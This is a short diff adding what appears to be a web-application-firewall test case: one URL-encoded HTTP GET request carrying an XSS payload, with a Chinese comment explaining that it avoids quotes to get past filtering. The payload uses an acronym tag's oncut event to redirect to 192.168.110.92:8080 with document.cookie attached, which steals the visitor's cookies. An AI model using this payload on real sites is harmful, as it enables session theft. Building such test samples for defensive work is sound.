@@ -1,0 +1,9 @@
+# XSS跨站脚本_GET_常规_事件_acronym标签_oncut事件-06506624
+# 攻击载荷利用了HTML中的acronym标签和oncut属性，触发location.href向恶意地址发送cookie信息。需要剪切一段文字触发，未使用单引号和双引号绕过测试
+GET /?id=%3Cacronym%20oncut=%28location.href=%22http:%2F%2F192.168.110.92:8080%2Findex.jsp%3Fid=%22+document.cookie%29%20%20value=%22XSS%22%20autofocus%20tabindex=1%3Etest&bid=hd_tag_m8mv25u1 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25u1
+RM-PRO-Token: d9c9f3771fdcaf2bfdaa9aa2a4bfb86d
+RM-PRO-Time: 1742808506694
+User-Agent: curl/7.83.1
+
